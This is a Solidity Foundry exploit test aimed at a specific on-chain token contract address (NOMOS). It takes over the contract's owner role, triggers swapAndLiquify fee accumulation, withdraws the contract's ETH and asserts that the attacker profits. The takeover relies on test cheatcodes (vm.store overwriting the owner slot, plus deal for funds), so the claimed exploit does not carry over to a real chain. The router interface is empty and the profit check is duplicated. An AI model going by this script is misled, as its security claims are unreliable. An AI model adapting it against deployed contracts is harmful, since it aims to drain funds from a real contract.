pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IUniswapV2Router02 {
}

interface NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function withdraw() external;
    function uniswapV2Pair() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc token;
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = NOMOS_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc(TARGET);
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // Inject ETH for gas
        deal(address(this), 10 ether);

        // Inject NOMOS tokens to attacker (1 billion tokens with 11 decimals)
        deal(address(token), address(this), 1_000_000_000 * 1e11);

        // Find owner slot and overwrite it - owner is at slot 0 in Ownable
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));

        // Verify we are now the owner
        assertEq(token.owner(), address(this));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Enable swap and liquify
        token.setSwapAndLiquifyEnabled(true);

        // Approve router to spend tokens
        token.approve(address(router), type(uint256).max);

        // Transfer tokens to Uniswap pair to trigger swapAndLiquify
        // This will accumulate ETH in the contract through fees
        uint256 transferAmount = 100_000_000 * 1e11; // 100 million tokens
        token.transfer(token.uniswapV2Pair(), transferAmount);

        // Check contract has accumulated ETH
        uint256 contractBalance = address(TARGET).balance;
        console.log("Contract ETH balance after swap:", contractBalance);

        // Now withdraw all ETH as the owner
        token.withdraw();

        // Verify profit
        uint256 finalBalance = address(this).balance;
        console.log("Attacker initial balance:", initialBalance);
        console.log("Attacker final balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Attacker should have more ETH after exploit");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

